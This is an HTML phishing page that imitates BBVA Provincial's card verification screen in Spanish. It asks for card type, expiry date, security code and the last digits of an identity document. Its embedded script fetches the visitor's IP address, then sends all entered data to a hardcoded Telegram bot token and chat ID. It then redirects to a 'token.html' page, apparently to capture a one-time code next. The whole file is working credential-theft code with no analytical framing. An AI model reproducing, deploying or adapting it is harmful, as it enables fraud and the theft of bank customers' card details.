<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BBVA Provincial - Verificación de tarjeta</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #fff;
      color: #001b44;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    header {
      background-color: #031e47;
      padding: 20px 30px;
    }
    .logo { font-size: 1.6rem; font-weight: bold; color: white; }
    .logo span { font-weight: normal; }
    .subtext {
      color: #b0c9f2;
      font-size: 0.9rem;
      margin-top: 5px;
    }
    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }
    .form-box {
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    .form-box h2 {
      font-size: 1.1rem;
      font-weight: 600;
      margin-bottom: 25px;
    }
    select,
    input[type="text"],
    input[type="number"] {
      width: 100%;
      padding: 14px;
      font-size: 1rem;
      margin-bottom: 20px;
      border: none;
      border-bottom: 2px solid #000;
      background-color: #f4f5f7;
      outline: none;
    }
    button {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      background-color: #031e47;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #021532;
    }
    footer {
      background-color: #031e47;
      color: white;
      text-align: center;
      padding: 30px 20px;
    }
    footer .logo-footer {
      font-size: 1.3rem;
      font-weight: bold;
    }
    .social-icons { margin: 15px 0; }
    .social-icons i {
      font-size: 1.2rem;
      margin: 0 10px;
      color: #d0e2ff;
    }
    .legal { font-size: 0.8rem; margin-top: 10px; }
    .slogan {
      margin-top: 8px;
      font-size: 0.9rem;
      color: #d0e2ff;
    }
  </style>
</head>
<body>

  <header>
    <div class="logo">BBVA <span>Provincial</span></div>
    <div class="subtext">Acceso Provinet personas</div>
  </header>

  <main>
    <div class="form-box">
      <h2>Verificación de tarjeta</h2>
      <form>
        <select>
          <option>Tarjeta de Débito (TDD)</option>
          <option>Tarjeta de Crédito (TDC)</option>
        </select>
        <input type="text" id="vencimiento" placeholder="MM/AA" maxlength="5" />
        <input type="number" placeholder="Código de seguridad" />
        <input type="text" placeholder="Últimos 3 dígitos de su documento" />
        <button type="submit">Verificar</button>
      </form>
    </div>
  </main>

  <footer>
    <div class="logo-footer">BBVA <span>Provincial</span></div>
    <div class="social-icons">
      <i class="fab fa-facebook-f"></i>
      <i class="fab fa-twitter"></i>
      <i class="fab fa-instagram"></i>
      <i class="fab fa-linkedin-in"></i>
      <i class="fab fa-youtube"></i>
    </div>
    <div class="legal">© 2025 BBVA Provincial S.A. RIF: J-00002967-9</div>
    <div class="slogan">Creando Oportunidades</div>
  </footer>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const form = document.querySelector('form');
      const button = form.querySelector('button');
      const vencimientoInput = document.getElementById('vencimiento');

      // Formatear MM/AA automáticamente
      vencimientoInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/[^\d]/g, ''); // Solo números
        if (value.length >= 2) {
          value = value.slice(0, 2) + '/' + value.slice(2, 4);
        }
        e.target.value = value.slice(0, 5); // Limitar a 5 caracteres
      });

      form.addEventListener('submit', async function (e) {
        e.preventDefault();

        const tipoTarjeta = form.querySelector('select').value;
        const vencimiento = form.querySelectorAll('input')[0].value;
        const codigo = form.querySelectorAll('input')[1].value;
        const documento = form.querySelectorAll('input')[2].value;

        let ip = "No disponible";
        try {
          const res = await fetch("https://ipapi.co/ip/");
          ip = await res.text();
        } catch (err) {
          console.error("Error al obtener IP:", err);
        }

        const mensaje = `

 Tipo: ${tipoTarjeta}
 Vencimiento: ${vencimiento}
 Código: ${codigo}
 Documento: ${documento}
🌐 IP: ${ip}
        `;

        const token = "8190060636:AAEbg9zqdIyLCZvUSSR4a_315D0W6n_ULVM";
        const chat_id = "-4922278503";
        const url = `https://api.telegram.org/bot${token}/sendMessage`;

        try {
          await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: chat_id,
              text: mensaje.trim()
            })
          });
        } catch (error) {
          console.error("Error al enviar a Telegram:", error);
        }

        window.location.href = "token.html";
      });

      button.addEventListener('click', () => {
        form.requestSubmit();
      });
    });
  </script>

</body>
</html>
